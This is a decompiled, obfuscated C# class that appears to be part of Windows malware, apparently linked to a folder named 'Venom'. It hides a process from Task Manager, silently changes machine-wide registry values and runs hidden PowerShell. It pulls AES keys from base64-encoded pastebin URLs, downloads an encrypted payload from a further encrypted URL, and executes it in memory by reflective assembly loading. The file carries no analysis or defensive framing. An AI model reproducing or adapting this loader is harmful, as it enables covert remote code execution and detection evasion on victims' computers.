using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

public class GClass38
{
	[CompilerGenerated]
	private sealed class Class47
	{
		public byte[] byte_0;

		internal void method_0()
		{
			smethod_6(byte_0);
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	public static void smethod_0(string proccess)
	{
		GetCurrentProcess();
		IntPtr taskManagerParentAddress = Class52.FindWindow(null, "Task Manager");
		Struct21 @struct = new Struct21(taskManagerParentAddress);
		while (@struct.lhWndParent != IntPtr.Zero)
		{
			int index = @struct.method_7(proccess);
			@struct.method_4(disable: true);
			@struct.method_2(index);
			@struct.method_4(disable: false);
		}
	}

	public static bool smethod_1()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static void smethod_2(string regPath, string name, string value)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(name) != value)
			{
				registryKey.SetValue(name, value, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void smethod_3(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		process.Start();
	}

	public static string smethod_4(string decrypted)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		string s = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3ZTcEZUWEhU")));
		string s2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1Y1VUJQcnVH")));
		byte[] bytes = Encoding.ASCII.GetBytes(decrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s);
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s2);
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
		cryptoTransform.Dispose();
		return Convert.ToBase64String(inArray);
	}

	public static string smethod_5(string encrypted)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		string s = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3ZTcEZUWEhU")));
		string s2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1Y1VUJQcnVH")));
		byte[] array = Convert.FromBase64String(encrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s);
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s2);
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		cryptoTransform.Dispose();
		return Encoding.ASCII.GetString(bytes);
	}

	private static void smethod_6(byte[] purdi)
	{
		try
		{
			Assembly assembly = AppDomain.CurrentDomain.Load(purdi);
			MethodInfo methodInfo = smethod_8(assembly);
			object obj = assembly.CreateInstance(methodInfo.Name);
			object[] obj2 = new object[1];
			if (methodInfo.GetParameters().Length == 0)
			{
				obj2 = null;
			}
			smethod_7(methodInfo, obj, obj2);
		}
		catch
		{
		}
	}

	private static object smethod_7(MethodInfo meth, object obj1, object[] obj2)
	{
		if (meth != null)
		{
			return meth.Invoke(obj1, obj2);
		}
		return false;
	}

	private static MethodInfo smethod_8(Assembly obj)
	{
		if (obj != null)
		{
			return obj.EntryPoint;
		}
		return null;
	}

	public static void smethod_9()
	{
		using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\");
		if (registryKey != null && registryKey.GetValue("Release") != null)
		{
			Console.WriteLine(".NET Framework Version: " + smethod_10((int)registryKey.GetValue("Release")));
			return;
		}
		string path = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_5("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWOIBuAy8A0Wwd+/Qk37BK9+i+wk5JxbXVR1Q4uTQlCe8YIpuyZyOCxjKf80gClzOhA=="))))).ReadToEnd();
		Path.Combine(path, "netf.exe");
		byte[] byte_0 = Convert.FromBase64String(smethod_5(encrypted));
		Task.Run(delegate
		{
			smethod_6(byte_0);
		}).Wait();
	}

	[CompilerGenerated]
	internal static string smethod_10(int releaseKey)
	{
		if (releaseKey >= 528040)
		{
			return "4.8 or later";
		}
		if (releaseKey >= 461808)
		{
			return "4.7.2";
		}
		if (releaseKey >= 461308)
		{
			return "4.7.1";
		}
		if (releaseKey >= 460798)
		{
			return "4.7";
		}
		if (releaseKey >= 394802)
		{
			return "4.6.2";
		}
		if (releaseKey >= 394254)
		{
			return "4.6.1";
		}
		if (releaseKey >= 393295)
		{
			return "4.6";
		}
		if (releaseKey >= 379893)
		{
			return "4.5.2";
		}
		if (releaseKey >= 378675)
		{
			return "4.5.1";
		}
		if (releaseKey >= 378389)
		{
			return "4.5";
		}
		return "No 4.5 or later version detected";
	}
}
